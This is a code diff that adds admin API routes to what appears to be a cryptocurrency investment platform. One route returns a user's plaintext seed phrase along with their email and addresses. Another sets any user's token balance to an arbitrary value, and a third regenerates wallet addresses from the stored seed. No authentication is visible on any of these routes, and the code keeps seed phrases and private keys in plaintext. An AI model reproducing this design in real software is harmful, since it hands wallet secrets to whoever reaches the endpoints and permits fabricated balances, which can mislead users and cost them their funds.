@@ -1865,6 +1865,107 @@ You are now on the free plan and will no longer receive automatic profit updates
     }
   });
 
+  // Admin: Get user's all token addresses and balances
+  app.get("/api/admin/user/:id/tokens", async (req, res) => {
+    try {
+      const userId = parseInt(req.params.id);
+      const user = await storage.getUser(userId);
+
+      if (!user) {
+        return res.status(404).json({ message: "User not found" });
+      }
+
+      const tokenAddresses = await storage.getUserTokenAddresses(userId);
+      const tokenBalances = await storage.getUserTokenBalances(userId);
+
+      res.json({ 
+        userId: user.id,
+        email: user.email,
+        bitcoinAddress: user.bitcoinAddress,
+        seedPhrase: user.seedPhrase,
+        tokenAddresses,
+        tokenBalances
+      });
+    } catch (error) {
+      console.error('Error fetching user tokens:', error);
+      res.status(500).json({ message: "Failed to get user tokens" });
+    }
+  });
+
+  // Admin: Update token balance
+  app.post("/api/admin/update-token-balance", async (req, res) => {
+    try {
+      const { userId, tokenSymbol, balance } = z.object({
+        userId: z.number(),
+        tokenSymbol: z.string(),
+        balance: z.string()
+      }).parse(req.body);
+
+      const tokenBalance = await storage.updateTokenBalance(userId, tokenSymbol, balance);
+      if (!tokenBalance) {
+        return res.status(404).json({ message: "Token balance not found" });
+      }
+
+      res.json({ message: "Token balance updated successfully", tokenBalance });
+    } catch (error) {
+      console.error('Error updating token balance:', error);
+      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update token balance" });
+    }
+  });
+
+  // Admin: Regenerate token addresses from seed phrase (fixes mismatches)
+  app.post("/api/admin/user/:id/regenerate-addresses", async (req, res) => {
+    try {
+      const userId = parseInt(req.params.id);
+      const user = await storage.getUser(userId);
+
+      if (!user) {
+        return res.status(404).json({ message: "User not found" });
+      }
+
+      if (!user.seedPhrase) {
+        return res.status(400).json({ message: "User has no seed phrase" });
+      }
+
+      // Generate token addresses from seed phrase
+      const generatedAddresses = generateTokenAddressesFromSeed(user.seedPhrase);
+      
+      // Update Bitcoin address if it doesn't match
+      const btcAddress = generatedAddresses['BTC'];
+      if (btcAddress && btcAddress !== user.bitcoinAddress) {
+        await storage.updateUserWallet(userId, btcAddress, user.privateKey || '', user.seedPhrase);
+      }
+      
+      // Delete existing token addresses for this user
+      await storage.deleteUserTokenAddresses(userId);
+      
+      // Store new token addresses in database
+      const createdAddresses = [];
+      for (const [token, address] of Object.entries(generatedAddresses)) {
+        try {
+          const created = await storage.createTokenAddress({
+            userId,
+            token,
+            address
+          });
+          createdAddresses.push(created);
+        } catch (error) {
+          console.error(`Error storing ${token} address:`, error);
+        }
+      }
+
+      res.json({ 
+        message: "Token addresses regenerated successfully", 
+        bitcoinAddress: btcAddress,
+        tokenAddresses: createdAddresses,
+        count: createdAddresses.length
+      });
+    } catch (error) {
+      console.error('Error regenerating addresses:', error);
+      res.status(500).json({ message: "Failed to regenerate addresses", error: error instanceof Error ? error.message : "Unknown error" });
+    }
+  });
+
   const httpServer = createServer(app);
 
   // Initialize default investment plans if they don't exist
